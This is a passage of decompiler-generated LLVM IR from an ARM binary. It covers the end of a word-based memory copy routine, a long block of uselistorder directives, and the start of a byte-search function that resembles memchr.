  %v5_17878 = load i8*, i8** %stack_var_-8, align 4
  %v6_17878 = ptrtoint i8* %v5_17878 to i32
  store i32 %v6_17878, i32* @r5, align 4
  store i32 %v11_17844, i32* @lr, align 4
  %v2_1787c = add i32 %v0_17870, -4
  store i32 %v2_1787c, i32* %r2.global-to-local, align 4
  %v4_1787c = add i32 %v0_17870, 2147483632
  %v5_1787c = and i32 %v2_1787c, %v4_1787c
  %v6_1787c = icmp slt i32 %v5_1787c, 0
  store i1 %v6_1787c, i1* %cpsr_v.global-to-local, align 1
  %v7_1787c = icmp slt i32 %v2_1787c, 0
  store i1 %v7_1787c, i1* %cpsr_n.global-to-local, align 1
  %v8_1787c = icmp eq i32 %v2_1787c, 0
  store i1 %v8_1787c, i1* %cpsr_z.global-to-local, align 1
  %v5_17880 = icmp slt i32 %v2_17870, -12
  br i1 %v5_17880, label %dec_label_pc_1789c, label %dec_label_pc_17884

dec_label_pc_17884:                               ; preds = %dec_label_pc_17878, %dec_label_pc_17838, %dec_label_pc_17884
  %v1_17890 = phi i32 [ %v5_17890, %dec_label_pc_17884 ], [ %v1_1786c, %dec_label_pc_17878 ], [ %v0_1780019, %dec_label_pc_17838 ]
  %v0_17884 = load i32, i32* @r3, align 4
  %v3_17884 = mul i32 %v0_17884, 65536
  store i32 %v3_17884, i32* %ip.global-to-local, align 4
  %v0_17888 = load i32, i32* %r1.global-to-local, align 4
  %v1_17888 = add i32 %v0_17888, -4
  %v2_17888 = inttoptr i32 %v1_17888 to i32*
  %v3_17888 = load i32, i32* %v2_17888, align 4
  store i32 %v3_17888, i32* @r3, align 4
  store i32 %v1_17888, i32* %r1.global-to-local, align 4
  %v4_1788c = udiv i32 %v3_17888, 65536
  %v5_1788c = or i32 %v4_1788c, %v3_17884
  store i32 %v5_1788c, i32* @ip, align 4
  %v2_17890 = add i32 %v1_17890, -4
  %v3_17890 = inttoptr i32 %v2_17890 to i32*
  store i32 %v5_1788c, i32* %v3_17890, align 4
  %v4_17890 = load i32, i32* %r0.global-to-local, align 4
  %v5_17890 = add i32 %v4_17890, -4
  store i32 %v5_17890, i32* %r0.global-to-local, align 4
  %v0_17894 = load i32, i32* %r2.global-to-local, align 4
  %v2_17894 = add i32 %v0_17894, -4
  store i32 %v2_17894, i32* %r2.global-to-local, align 4
  %v6_17898 = icmp slt i32 %v0_17894, 4
  br i1 %v6_17898, label %dec_label_pc_1789c.loopexit, label %dec_label_pc_17884

dec_label_pc_1789c.loopexit:                      ; preds = %dec_label_pc_17884
  %v4_17894 = sub i32 3, %v0_17894
  %v5_17894 = and i32 %v4_17894, %v0_17894
  %v6_17894 = icmp slt i32 %v5_17894, 0
  %v7_17894 = icmp slt i32 %v2_17894, 0
  store i1 %v6_17894, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17894, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1789c

dec_label_pc_1789c:                               ; preds = %dec_label_pc_1789c.loopexit, %dec_label_pc_17878
  %v2_1777452 = phi i32 [ %v5_17890, %dec_label_pc_1789c.loopexit ], [ %v1_1786c, %dec_label_pc_17878 ]
  %v0_1776448 = phi i32 [ %v2_17894, %dec_label_pc_1789c.loopexit ], [ %v2_1787c, %dec_label_pc_17878 ]
  %v0_1789c = load i32, i32* %r1.global-to-local, align 4
  %v1_1789c = add i32 %v0_1789c, 2
  store i32 %v1_1789c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_178a4:                               ; preds = %dec_label_pc_177b8
  br i1 %v5_178a8, label %dec_label_pc_178f0, label %dec_label_pc_178ac

dec_label_pc_178ac:                               ; preds = %dec_label_pc_178a4
  store i32 %v2_178a4, i32* %r2.global-to-local, align 4
  %v3_178b0 = load i32, i32* @r4, align 4
  store i32 %v3_178b0, i32* %stack_var_-12, align 4
  %v6_178b0 = load i32, i32* @r5, align 4
  %v8_178b0 = inttoptr i32 %v6_178b0 to i8*
  store i8* %v8_178b0, i8** %stack_var_-8, align 4
  %v11_178b0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_178b4

dec_label_pc_178b4:                               ; preds = %dec_label_pc_178b4.dec_label_pc_178b4_crit_edge, %dec_label_pc_178ac
  %v0_178d8 = phi i32 [ %v1_178d8, %dec_label_pc_178b4.dec_label_pc_178b4_crit_edge ], [ %v0_1780019, %dec_label_pc_178ac ]
  %v0_178b8 = phi i32 [ %v0_178b8.pre, %dec_label_pc_178b4.dec_label_pc_178b4_crit_edge ], [ %v1_177b8, %dec_label_pc_178ac ]
  %v0_178b4 = phi i32 [ %v0_178b4.pre, %dec_label_pc_178b4.dec_label_pc_178b4_crit_edge ], [ %v2_177bc, %dec_label_pc_178ac ]
  %v3_178b4 = mul i32 %v0_178b4, 16777216
  store i32 %v3_178b4, i32* %lr.global-to-local, align 4
  %v1_178b8 = add i32 %v0_178b8, -4
  %v2_178b8 = inttoptr i32 %v1_178b8 to i32*
  %v3_178b8 = load i32, i32* %v2_178b8, align 4
  store i32 %v3_178b8, i32* @r3, align 4
  %v4_178b8 = add i32 %v0_178b8, -8
  %v5_178b8 = inttoptr i32 %v4_178b8 to i32*
  %v6_178b8 = load i32, i32* %v5_178b8, align 4
  store i32 %v6_178b8, i32* %r4.global-to-local, align 4
  %v7_178b8 = add i32 %v0_178b8, -12
  %v8_178b8 = inttoptr i32 %v7_178b8 to i32*
  %v9_178b8 = load i32, i32* %v8_178b8, align 4
  store i32 %v9_178b8, i32* %r5.global-to-local, align 4
  %v10_178b8 = add i32 %v0_178b8, -16
  %v11_178b8 = inttoptr i32 %v10_178b8 to i32*
  %v12_178b8 = load i32, i32* %v11_178b8, align 4
  store i32 %v10_178b8, i32* %r1.global-to-local, align 4
  %v4_178bc = udiv i32 %v12_178b8, 256
  %v5_178bc = or i32 %v4_178bc, %v3_178b4
  store i32 %v5_178bc, i32* %lr.global-to-local, align 4
  %v3_178c0 = mul i32 %v12_178b8, 16777216
  %v4_178c4 = udiv i32 %v9_178b8, 256
  %v5_178c4 = or i32 %v3_178c0, %v4_178c4
  store i32 %v5_178c4, i32* @ip, align 4
  %v3_178c8 = mul i32 %v9_178b8, 16777216
  %v4_178cc = udiv i32 %v6_178b8, 256
  %v5_178cc = or i32 %v3_178c8, %v4_178cc
  store i32 %v5_178cc, i32* %r5.global-to-local, align 4
  %v3_178d0 = mul i32 %v6_178b8, 16777216
  %v4_178d4 = udiv i32 %v3_178b8, 256
  %v5_178d4 = or i32 %v3_178d0, %v4_178d4
  store i32 %v5_178d4, i32* %r4.global-to-local, align 4
  %v1_178d8 = add i32 %v0_178d8, -16
  %v2_178d8 = inttoptr i32 %v1_178d8 to i32*
  store i32 %v5_178d4, i32* %v2_178d8, align 4
  %v4_178d8 = add i32 %v0_178d8, -12
  %v5_178d8 = inttoptr i32 %v4_178d8 to i32*
  %v6_178d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_178d8, i32* %v5_178d8, align 4
  %v7_178d8 = add i32 %v0_178d8, -8
  %v8_178d8 = inttoptr i32 %v7_178d8 to i32*
  %v9_178d8 = load i32, i32* @ip, align 4
  store i32 %v9_178d8, i32* %v8_178d8, align 4
  %v10_178d8 = add i32 %v0_178d8, -4
  %v11_178d8 = inttoptr i32 %v10_178d8 to i32*
  %v12_178d8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_178d8, i32* %v11_178d8, align 4
  store i32 %v1_178d8, i32* %r0.global-to-local, align 4
  %v0_178dc = load i32, i32* %r2.global-to-local, align 4
  %v2_178dc = add i32 %v0_178dc, -16
  store i32 %v2_178dc, i32* %r2.global-to-local, align 4
  %v6_178e0 = icmp slt i32 %v0_178dc, 16
  br i1 %v6_178e0, label %dec_label_pc_178e4, label %dec_label_pc_178b4.dec_label_pc_178b4_crit_edge

dec_label_pc_178b4.dec_label_pc_178b4_crit_edge:  ; preds = %dec_label_pc_178b4
  %v0_178b4.pre = load i32, i32* @r3, align 4
  %v0_178b8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_178b4

dec_label_pc_178e4:                               ; preds = %dec_label_pc_178b4
  %v2_178e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_178e4, i32* @r4, align 4
  %v5_178e4 = load i8*, i8** %stack_var_-8, align 4
  %v6_178e4 = ptrtoint i8* %v5_178e4 to i32
  store i32 %v6_178e4, i32* @r5, align 4
  store i32 %v11_178b0, i32* @lr, align 4
  %v2_178e8 = add i32 %v0_178dc, -4
  store i32 %v2_178e8, i32* %r2.global-to-local, align 4
  %v4_178e8 = add i32 %v0_178dc, 2147483632
  %v5_178e8 = and i32 %v2_178e8, %v4_178e8
  %v6_178e8 = icmp slt i32 %v5_178e8, 0
  store i1 %v6_178e8, i1* %cpsr_v.global-to-local, align 1
  %v7_178e8 = icmp slt i32 %v2_178e8, 0
  store i1 %v7_178e8, i1* %cpsr_n.global-to-local, align 1
  %v8_178e8 = icmp eq i32 %v2_178e8, 0
  store i1 %v8_178e8, i1* %cpsr_z.global-to-local, align 1
  %v5_178ec = icmp slt i32 %v2_178dc, -12
  br i1 %v5_178ec, label %dec_label_pc_17908, label %dec_label_pc_178f0

dec_label_pc_178f0:                               ; preds = %dec_label_pc_178e4, %dec_label_pc_178a4, %dec_label_pc_178f0
  %v1_178fc = phi i32 [ %v5_178fc, %dec_label_pc_178f0 ], [ %v1_178d8, %dec_label_pc_178e4 ], [ %v0_1780019, %dec_label_pc_178a4 ]
  %v0_178f0 = load i32, i32* @r3, align 4
  %v3_178f0 = mul i32 %v0_178f0, 16777216
  store i32 %v3_178f0, i32* %ip.global-to-local, align 4
  %v0_178f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_178f4 = add i32 %v0_178f4, -4
  %v2_178f4 = inttoptr i32 %v1_178f4 to i32*
  %v3_178f4 = load i32, i32* %v2_178f4, align 4
  store i32 %v3_178f4, i32* @r3, align 4
  store i32 %v1_178f4, i32* %r1.global-to-local, align 4
  %v4_178f8 = udiv i32 %v3_178f4, 256
  %v5_178f8 = or i32 %v4_178f8, %v3_178f0
  store i32 %v5_178f8, i32* @ip, align 4
  %v2_178fc = add i32 %v1_178fc, -4
  %v3_178fc = inttoptr i32 %v2_178fc to i32*
  store i32 %v5_178f8, i32* %v3_178fc, align 4
  %v4_178fc = load i32, i32* %r0.global-to-local, align 4
  %v5_178fc = add i32 %v4_178fc, -4
  store i32 %v5_178fc, i32* %r0.global-to-local, align 4
  %v0_17900 = load i32, i32* %r2.global-to-local, align 4
  %v2_17900 = add i32 %v0_17900, -4
  store i32 %v2_17900, i32* %r2.global-to-local, align 4
  %v6_17904 = icmp slt i32 %v0_17900, 4
  br i1 %v6_17904, label %dec_label_pc_17908.loopexit, label %dec_label_pc_178f0

dec_label_pc_17908.loopexit:                      ; preds = %dec_label_pc_178f0
  %v4_17900 = sub i32 3, %v0_17900
  %v5_17900 = and i32 %v4_17900, %v0_17900
  %v6_17900 = icmp slt i32 %v5_17900, 0
  %v7_17900 = icmp slt i32 %v2_17900, 0
  store i1 %v6_17900, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17900, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17908

dec_label_pc_17908:                               ; preds = %dec_label_pc_17908.loopexit, %dec_label_pc_178e4
  %v2_1777453 = phi i32 [ %v5_178fc, %dec_label_pc_17908.loopexit ], [ %v1_178d8, %dec_label_pc_178e4 ]
  %v0_1776449 = phi i32 [ %v2_17900, %dec_label_pc_17908.loopexit ], [ %v2_178e8, %dec_label_pc_178e4 ]
  %v0_17908 = load i32, i32* %r1.global-to-local, align 4
  %v1_17908 = add i32 %v0_17908, 1
  store i32 %v1_17908, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_178fc, { 0, 2, 1 }
  uselistorder i32 %v3_178f0, { 1, 0 }
  uselistorder i32 %v2_178e8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_178d8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_178b8, { 1, 0 }
  uselistorder i32 %v3_178b4, { 1, 0 }
  uselistorder i32 %v0_178b8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_178d8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17890, { 0, 2, 1 }
  uselistorder i32 %v3_17884, { 1, 0 }
  uselistorder i32 %v2_1787c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1786c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1784c, { 1, 0 }
  uselistorder i32 %v3_17848, { 1, 0 }
  uselistorder i32 %v0_1784c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1786c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17824, { 0, 2, 1 }
  uselistorder i32 %v3_17818, { 1, 0 }
  uselistorder i32 %v2_17810, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17800, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_177e0, { 1, 0 }
  uselistorder i32 %v3_177dc, { 1, 0 }
  uselistorder i32 %v0_177e0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17800, { 3, 2, 1, 0 }
  uselistorder i1 %v5_178a8, { 2, 0, 1 }
  uselistorder i32 %v0_177c0, { 1, 0 }
  uselistorder i32 %v0_178ac, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1780019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_177b0, { 2, 1, 0 }
  uselistorder i32 %v0_177b0, { 2, 0, 1 }
  uselistorder i32 %v2_177a8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_177a8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_177a8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1780020, { 2, 1, 0 }
  uselistorder i32 %v11_17784, { 1, 0 }
  uselistorder i32 %v7_17784, { 1, 0 }
  uselistorder i32 %v1_17764, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_17764, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17768, { 1, 0 }
  uselistorder i32 %v7_1775c, { 0, 2, 1 }
  uselistorder i32 %v10_17758, { 1, 0 }
  uselistorder i32 %v9_17750, { 1, 0, 2 }
  uselistorder i32 %v6_1774c, { 1, 0 }
  uselistorder i32 %v2_17744, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_17744, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_17754, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17738, { 0, 2, 1 }
  uselistorder i32 %v13_17734, { 1, 0 }
  uselistorder i32 %v4_17730, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_17730, { 2, 0, 1 }
  uselistorder i32 %v6_17738, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17728, { 0, 2, 1 }
  uselistorder i32 %v16_17724, { 1, 0 }
  uselistorder i32 %v4_17720, { 1, 2, 0 }
  uselistorder i32 %v0_17730.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_17728, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_17714, { 0, 3, 2, 1 }
  uselistorder i32 %v10_17710, { 1, 0 }
  uselistorder i32 %v1_1770c, { 1, 0 }
  uselistorder i32 %v10_17708, { 1, 0 }
  uselistorder i32 %v0_17708, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1770c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_17700, { 0, 2, 1 }
  uselistorder i32 %v2_176f4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_176f4, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1770c37, { 1, 2, 0 }
  uselistorder i32 %v1_176ec, { 2, 1, 0 }
  uselistorder i32 %v1_176e4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_176dc, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_176d8, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_176d4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_176d4, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_176c4, { 0, 2, 1 }
  uselistorder i32 %v4_176c0, { 1, 0 }
  uselistorder i32 %v3_176b4, { 1, 0 }
  uselistorder i32 %v1_176ac, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_176a0, { 1, 0 }
  uselistorder i32 %v12_1769c, { 0, 2, 1 }
  uselistorder i32 %v8_1767c, { 1, 0, 2 }
  uselistorder i32 %v5_1767c, { 1, 0, 2 }
  uselistorder i32 %v2_1767c, { 1, 0, 2 }
  uselistorder i32 %v0_1767c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1769c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_17658, { 0, 2, 1 }
  uselistorder i32 %v4_17654, { 1, 0 }
  uselistorder i32 %v3_17648, { 1, 0 }
  uselistorder i32 %v1_17640, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17634, { 1, 0 }
  uselistorder i32 %v12_17630, { 0, 2, 1 }
  uselistorder i32 %v8_17610, { 1, 0, 2 }
  uselistorder i32 %v5_17610, { 1, 0, 2 }
  uselistorder i32 %v2_17610, { 1, 0, 2 }
  uselistorder i32 %v0_17610, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17630, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_175ec, { 0, 2, 1 }
  uselistorder i32 %v4_175e8, { 1, 0 }
  uselistorder i32 %v3_175dc, { 1, 0 }
  uselistorder i32 %v1_175d4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_175c8, { 1, 0 }
  uselistorder i32 %v12_175c4, { 0, 2, 1 }
  uselistorder i32 %v8_175a4, { 1, 0, 2 }
  uselistorder i32 %v5_175a4, { 1, 0, 2 }
  uselistorder i32 %v2_175a4, { 1, 0, 2 }
  uselistorder i32 %v0_175a4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_175c4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_17600, { 0, 2, 1 }
  uselistorder i32 %v1_175fc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_17580, { 2, 0, 1, 3 }
  uselistorder i32 %v2_17580, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17604, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1769c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_17574, { 1, 0 }
  uselistorder i32 %v0_17574, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1756c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1756c, { 1, 0, 2 }
  uselistorder i32 %v0_1756c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1769c77, { 1, 0 }
  uselistorder i32 %v1_1754c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_17554, { 1, 0 }
  uselistorder i32 %v0_17528, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1751c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_17508, { 1, 0, 2 }
  uselistorder i32 %v1_17504, { 1, 0 }
  uselistorder i32 %v1_174fc, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_174fc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_174f4, { 0, 2, 1 }
  uselistorder i32 %v3_174f4, { 3, 0, 1, 2 }
  uselistorder i1 %v0_174f4, { 1, 0 }
  uselistorder i1 %v1_174f4, { 1, 0 }
  uselistorder i32 %v3_174f0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_174e8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_174d4, { 1, 2, 0 }
  uselistorder i32 %v1_174cc, { 0, 2, 1 }
  uselistorder i32 %v12_174c8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_174bc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_174c0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_174b0, { 0, 2, 1 }
  uselistorder i32 %v1_174a8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_174a8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_174a0, { 1, 0 }
  uselistorder i32 %v1_17498, { 2, 1, 0 }
  uselistorder i32 %v2_17490, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_17490, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1748c, { 1, 0 }
  uselistorder i32 %v2_17480, { 1, 0 }
  uselistorder i32 %v1_17480, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_17480, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 68, 1, 2, 3, 4, 5, 69, 6, 7, 8, 9, 10, 70, 11, 12, 66, 67, 71, 27, 13, 15, 14, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 28, 29, 61, 30, 31, 32, 33, 34, 62, 35, 36, 37, 38, 39, 63, 40, 41, 42, 43, 44, 64, 45, 46, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 65 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0, 56, 3, 4, 6, 8, 5, 57, 7, 9, 11, 54, 10, 58, 53, 55, 59, 62, 60, 66, 67, 12, 13, 14, 16, 15, 17, 18, 61, 19, 20, 63, 21, 64, 22, 65, 23, 24, 25, 26, 27, 30, 28, 40, 29, 31, 34, 32, 41, 33, 35, 38, 36, 42, 37, 39, 43, 44, 47, 45, 48, 46, 49, 50, 51, 52 }
  uselistorder i32* %r0.global-to-local, { 0, 28, 1, 2, 29, 3, 4, 30, 5, 27, 33, 34, 6, 7, 19, 8, 10, 9, 11, 12, 31, 13, 14, 32, 15, 16, 17, 18, 20, 21, 23, 22, 24, 25, 26 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 5, 7, 2, 9, 3, 10, 8, 46, 47, 11, 12, 13, 14, 15, 16, 17, 18, 4, 19, 20, 21, 22, 23, 1, 24, 6, 25, 0, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i1* %cpsr_v.global-to-local, { 3, 7, 6, 9, 1, 10, 8, 44, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 21, 22, 0, 23, 4, 24, 5, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_n.global-to-local, { 3, 7, 6, 9, 1, 10, 8, 49, 50, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 21, 22, 23, 24, 0, 25, 4, 26, 5, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_178f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17884, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17818, { 2, 0, 1 }
  uselistorder label %dec_label_pc_177b8, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_17744, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_17708, { 1, 0 }
  uselistorder label %dec_label_pc_176f4, { 1, 0 }
  uselistorder label %dec_label_pc_176b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17648, { 2, 0, 1 }
  uselistorder label %dec_label_pc_175dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1757c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1754c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_174e8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_174a8, { 1, 0 }
}

define i32 @function_17910(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17910:
  %v1_17914 = urem i32 %arg1, 256
  %v0_17930.pr = load i32, i32* @r2, align 4
  %v2_1793015 = icmp eq i32 %v0_17930.pr, 0
  %v0_17944.pre = load i32, i32* @r0, align 4
  br i1 %v2_1793015, label %dec_label_pc_17940, label %dec_label_pc_17938

dec_label_pc_1791c:                               ; preds = %dec_label_pc_17938
  %v1_1791c = inttoptr i32 %v0_1792c to i8*
  %v2_1791c = load i8, i8* %v1_1791c, align 1
  %v3_1791c = zext i8 %v2_1791c to i32
  %v9_17920 = icmp eq i32 %v3_1791c, %v1_17914
  br i1 %v9_17920, label %dec_label_pc_179f0, label %dec_label_pc_17928

dec_label_pc_17928:                               ; preds = %dec_label_pc_1791c
  %v1_17928 = add i32 %v0_17928, -1
  %v1_1792c = add i32 %v0_1792c, 1
  %v2_17930 = icmp eq i32 %v1_17928, 0
  br i1 %v2_17930, label %dec_label_pc_17940, label %dec_label_pc_17938

dec_label_pc_17938:                               ; preds = %dec_label_pc_17910, %dec_label_pc_17928
  %v0_17928 = phi i32 [ %v1_17928, %dec_label_pc_17928 ], [ %v0_17930.pr, %dec_label_pc_17910 ]
  %v0_1792c = phi i32 [ %v1_1792c, %dec_label_pc_17928 ], [ %v0_17944.pre, %dec_label_pc_17910 ]
  %v1_17938 = urem i32 %v0_1792c, 4
  %v2_17938 = icmp eq i32 %v1_17938, 0
  br i1 %v2_17938, label %dec_label_pc_17940, label %dec_label_pc_1791c

dec_label_pc_17940:                               ; preds = %dec_label_pc_17928, %dec_label_pc_17938, %dec_label_pc_17910
  %v0_179bc22 = phi i32 [ 0, %dec_label_pc_17910 ], [ 0, %dec_label_pc_17928 ], [ %v0_17928, %dec_label_pc_17938 ]
  %v0_17944 = phi i32 [ %v0_17944.pre, %dec_label_pc_17910 ], [ %v1_1792c, %dec_label_pc_17928 ], [ %v0_1792c, %dec_label_pc_17938 ]
  %v4_17940 = mul nuw nsw i32 %v1_17914, 256
  %v5_17940 = or i32 %v4_17940, %v1_17914
  %v4_17948 = mul i32 %v5_17940, 65536
  %v5_17948 = or i32 %v4_17948, %v5_17940
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_179bc22, 3
  br i1 %tmp, label %dec_label_pc_17950, label %dec_label_pc_179e4.preheader

dec_label_pc_17950:                               ; preds = %dec_label_pc_17940, %dec_label_pc_179bc.backedge
  %v0_1796c60 = phi i32 [ %v1_1796c, %dec_label_pc_179bc.backedge ], [ %v0_179bc22, %dec_label_pc_17940 ]
  %v0_1799059 = phi i32 [ %v4_17950, %dec_label_pc_179bc.backedge ], [ %v0_17944, %dec_label_pc_17940 ]
  %v1_17950 = inttoptr i32 %v0_1799059 to i32*
  %v2_17950 = load i32, i32* %v1_17950, align 4
  %v4_17950 = add i32 %v0_1799059, 4
  %v2_17954 = xor i32 %v2_17950, %v5_17948
  %v2_17958 = add i32 %v2_17954, 2130640639
  %v1_1795c = sub i32 -1, %v2_17954
  %v2_17960 = xor i32 %v2_17958, %v1_1795c
  %v2_17964 = and i32 %v2_17960, -2130640640
  %v2_17968 = icmp eq i32 %v2_17964, 0
  %v1_1796c = add i32 %v0_1796c60, -4
  br i1 %v2_17968, label %dec_label_pc_179bc.backedge, label %dec_label_pc_17974

dec_label_pc_179bc.backedge:                      ; preds = %dec_label_pc_17950, %dec_label_pc_179ac
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_1796c, 3
  br i1 %tmp73, label %dec_label_pc_17950, label %dec_label_pc_179e4.preheader

dec_label_pc_17974:                               ; preds = %dec_label_pc_17950
  %v2_17974 = inttoptr i32 %v0_1799059 to i8*
  %v3_17974 = load i8, i8* %v2_17974, align 1
  %v4_17974 = zext i8 %v3_17974 to i32
  %v9_1797c = icmp eq i32 %v4_17974, %v1_17914
  %v1_17980 = add i32 %v0_1799059, 3
  store i32 %v1_17980, i32* @ip, align 4
  br i1 %v9_1797c, label %dec_label_pc_179f0, label %dec_label_pc_17988

dec_label_pc_17988:                               ; preds = %dec_label_pc_17974
  %v1_17988 = add i32 %v0_1799059, 1
